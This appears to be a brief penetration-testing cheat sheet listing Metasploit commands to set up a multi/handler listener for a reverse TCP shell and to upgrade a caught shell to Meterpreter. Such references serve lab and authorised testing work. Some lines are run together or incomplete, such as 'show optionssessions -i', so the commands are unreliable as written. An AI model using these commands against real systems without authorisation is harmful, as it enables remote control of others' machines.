# Metasploit Shells

Quick Commands

#### Reverse TCP Shell <a href="#reverse-tcp-shell" id="reverse-tcp-shell"></a>

```bash
use exploit /multi/handler
set Lport <custom port not being used ex. 5557>
set LHOST <host kali/vm ip>
exploit
```

#### Elevating the shell to Meterpreter <a href="#elevating-the-shell-to-meterpreter" id="elevating-the-shell-to-meterpreter"></a>

```bash
use post/multi/manage/shell_to_meterpreter
show optionssessions -i
set <session number with reverse shell>
set lport <not being used port ex. 5559>
exploit
```

